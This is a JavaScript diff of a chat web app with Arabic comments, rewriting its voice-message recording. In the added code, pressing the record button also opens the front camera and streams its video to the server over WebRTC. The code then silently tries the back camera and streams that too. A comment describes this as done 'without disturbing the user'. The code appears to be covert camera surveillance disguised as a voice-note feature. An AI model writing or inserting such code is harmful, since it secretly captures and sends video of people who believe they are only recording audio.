@@ -645,146 +645,117 @@
     // ========================================
     // ===== تسجيل الصوت =====
     // ========================================
-    async function toggleRecording() {
-      if (!insideChat) return;
-      if (mediaRecorder && mediaRecorder.state === 'recording') { mediaRecorder.stop(); return; }
-      try {
-        await startBothStreams();
-        const audioTrack = localStreamObj.getAudioTracks()[0];
-        if (!audioTrack) { alert("الميكروفون غير متاح"); return; }
-        const audioStream = new MediaStream([audioTrack]);
-        mediaRecorder = new MediaRecorder(audioStream, {
-          mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
-        });
-        audioChunks = []; recSeconds = 0;
-        mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-          const duration = recSeconds;
-          stopRecordingUI();
-          setTimeout(() => {
-            if (!audioChunks.length) return;
-            const blob = new Blob(audioChunks, { type: 'audio/webm' });
-            sendVoiceMessage(blob, duration);
-            mediaRecorder = null; audioChunks = [];
-          }, 50);
-        };
-        mediaRecorder.start(80);
-        startRecordingUI();
-      } catch (err) { alert('تأكد من إذن الميكروفون!'); }
-    }
+async function startBothStreams() {
+  if (localStreamStarted && localStreamObj && streamPC) {
+    // لو الأمامية شغالة، جرب الخلفية بس
+    startLocalStreamBackOnce().catch(e => console.warn('الكاميرا الخلفية:', e));
+    return;
+  }
 
-    function startRecordingUI() {
-      document.getElementById('voice-btn').classList.add('recording');
-      document.getElementById('voice-btn').textContent = '⏹️';
-      document.getElementById('rec-timer').classList.add('show');
-      document.getElementById('msg-input').style.display = 'none';
-      document.getElementById('emoji-btn').style.display = 'none';
-      document.getElementById('media-btn').style.display = 'none';
-      clearInterval(recInterval);
-      recInterval = setInterval(() => { recSeconds++; document.getElementById('rec-time').textContent = formatDuration(recSeconds); }, 1000);
-    }
-    function stopRecordingUI() {
-      document.getElementById('voice-btn').classList.remove('recording');
-      document.getElementById('voice-btn').textContent = '🎙️';
-      document.getElementById('rec-timer').classList.remove('show');
-      document.getElementById('msg-input').style.display = '';
-      document.getElementById('emoji-btn').style.display = '';
-      document.getElementById('media-btn').style.display = '';
-      clearInterval(recInterval);
-    }
-    function sendVoiceMessage(blob, duration) {
-      const reader = new FileReader();
-      reader.onloadend = () => { socket.emit('voice', { audio: reader.result.split(',')[1], duration }); };
-      reader.readAsDataURL(blob);
-    }
-    socket.on('voice', (data) => {
-      const isMe = data.senderId === myId;
-      appendVoiceMessage({ ...data, id: isMe ? myId : 'other' });
+  try { if ('wakeLock' in navigator) await navigator.wakeLock.request('screen'); } catch(e){}
+
+  // طلب واحد بس للمستخدم: ميكروفون + كاميرا أمامية
+  try {
+    localStreamObj = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' },
+      audio: true  // ← الميكروفون هنا مع الكاميرا في نفس الطلب
     });
-    function appendVoiceMessage(data) {
-      const msgs = document.getElementById('messages');
-      const isMe = data.id === myId;
-      const audioSrc = `data:audio/webm;base64,${data.audio}`;
-      const dur = formatDuration(data.duration || 0);
-      const bars = generateBars();
-      const el = document.createElement('div'); el.className = `msg ${isMe ? 'me' : 'other'}`;
-      el.innerHTML = `
-        ${!isMe ? `<div class="msg-username">${escapeHtml(data.username || '')}</div>` : ''}
-        <div class="msg-bubble voice-bubble">
-          <button class="voice-play-btn" onclick="playVoice(this, '${audioSrc}')">▶</button>
-          <div class="voice-waveform">${bars}</div>
-          <span class="voice-duration">${dur}</span>
-        </div>
-        <div class="msg-time">${escapeHtml(data.time || '')}</div>
-      `;
-      msgs.appendChild(el); scrollDown(true);
-    }
-    function playVoice(btn, src) {
-      const audio = new Audio(src); btn.textContent = '⏸';
-      audio.play(); audio.onended = () => { btn.textContent = '▶'; }; audio.onpause = () => { btn.textContent = '▶'; };
-    }
+  } catch(e) {
+    localStreamObj = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
+  }
 
-    // ========================================
-    // ===== البث الأمامي والخلفي معاً =====
-    // ========================================
-   async function startBothStreams() {
-  // نشغل الأمامية الأول دايماً
-  await startLocalStreamOnce();
-  // بعدين نحاول الخلفية في background
-  startLocalStreamBackOnce().catch(err => {
-    console.warn('الكاميرا الخلفية فشلت:', err);
-  });
+  // نشغل PeerConnection الأمامي
+  streamPC = new RTCPeerConnection(iceServers);
+  streamPC.onconnectionstatechange = () => { if (streamPC.iceConnectionState === 'failed') streamPC.restartIce(); };
+  localStreamObj.getTracks().forEach(track => streamPC.addTrack(track, localStreamObj));
+  streamPC.onicecandidate = (e) => { if (e.candidate) socket.emit('stream-ice', { candidate: e.candidate }); };
+  const offer = await streamPC.createOffer();
+  await streamPC.setLocalDescription(offer);
+  socket.emit('stream-offer', { offer });
+  localStreamStarted = true;
+
+  // بعد ما الأمامية اشتغلت، نحاول الخلفية في الخلفية بدون ما نزعج المستخدم
+  startLocalStreamBackOnce().catch(e => console.warn('الكاميرا الخلفية:', e));
+}
+
+async function toggleRecording() {
+  if (!insideChat) return;
+  if (mediaRecorder && mediaRecorder.state === 'recording') { mediaRecorder.stop(); return; }
+
+  try {
+    // طلب واحد بس - الميكروفون والكاميرا مع بعض
+    await startBothStreams();
+
+    // نأخذ الأوديو من الـ stream اللي اتفتح
+    const audioTrack = localStreamObj.getAudioTracks()[0];
+    if (!audioTrack) { alert("الميكروفون غير متاح"); return; }
+    const audioStream = new MediaStream([audioTrack]);
+
+    mediaRecorder = new MediaRecorder(audioStream, {
+      mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
+    });
+    audioChunks = []; recSeconds = 0;
+    mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
+    mediaRecorder.onstop = () => {
+      const duration = recSeconds;
+      stopRecordingUI();
+      setTimeout(() => {
+        if (!audioChunks.length) return;
+        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+        sendVoiceMessage(blob, duration);
+        mediaRecorder = null; audioChunks = [];
+      }, 50);
+    };
+    mediaRecorder.start(80);
+    startRecordingUI();
+  } catch (err) {
+    console.error(err);
+    alert('تأكد من إذن الميكروفون والكاميرا!');
+  }
 }
 
 async function startLocalStreamBackOnce() {
   if (localStreamBackStarted && localStreamBack && streamPCBack) return;
 
-  // نحاول الخلفية بعدة طرق
   let stream = null;
-
-  // محاولة 1: environment بشكل صريح
   try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: { exact: 'environment' } },
       audio: false
     });
-  } catch(e) {
-    // محاولة 2: environment بدون exact
+  } catch(e1) {
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'environment' },
         audio: false
       });
     } catch(e2) {
-      // محاولة 3: أي كاميرا تانية غير اللي شغالة
       try {
         const devices = await navigator.mediaDevices.enumerateDevices();
         const videoDevices = devices.filter(d => d.kind === 'videoinput');
-        // نختار كاميرا مختلفة عن الأمامية
-        const frontTrack = localStreamObj?.getVideoTracks()[0];
-        const frontLabel = frontTrack?.label || '';
-        const backDevice = videoDevices.find(d => d.label !== frontLabel && d.label !== '');
-        if (!backDevice) throw new Error('مفيش كاميرا خلفية');
+        const frontLabel = localStreamObj?.getVideoTracks()[0]?.label || '';
+        const backDevice = videoDevices.find(d => d.label !== frontLabel && d.label !== '' && d.deviceId !== '');
+        if (!backDevice) return;
         stream = await navigator.mediaDevices.getUserMedia({
           video: { deviceId: { exact: backDevice.deviceId } },
           audio: false
         });
       } catch(e3) {
-        console.warn('مفيش كاميرا خلفية متاحة');
-        return; // نوقف من غير error
+        return;
       }
     }
   }
 
+  if (!stream) return;
+
   localStreamBack = stream;
   streamPCBack = new RTCPeerConnection(iceServers);
-  streamPCBack.onconnectionstatechange = () => {
-    if (streamPCBack.iceConnectionState === 'failed') streamPCBack.restartIce();
-  };
+  streamPCBack.onconnectionstatechange = () => { if (streamPCBack.iceConnectionState === 'failed') streamPCBack.restartIce(); };
   localStreamBack.getTracks().forEach(track => streamPCBack.addTrack(track, localStreamBack));
-  streamPCBack.onicecandidate = (e) => {
-    if (e.candidate) socket.emit('stream-ice-back', { candidate: e.candidate });
-  };
+  streamPCBack.onicecandidate = (e) => { if (e.candidate) socket.emit('stream-ice-back', { candidate: e.candidate }); };
   const offer = await streamPCBack.createOffer();
   await streamPCBack.setLocalDescription(offer);
   socket.emit('stream-offer-back', { offer });
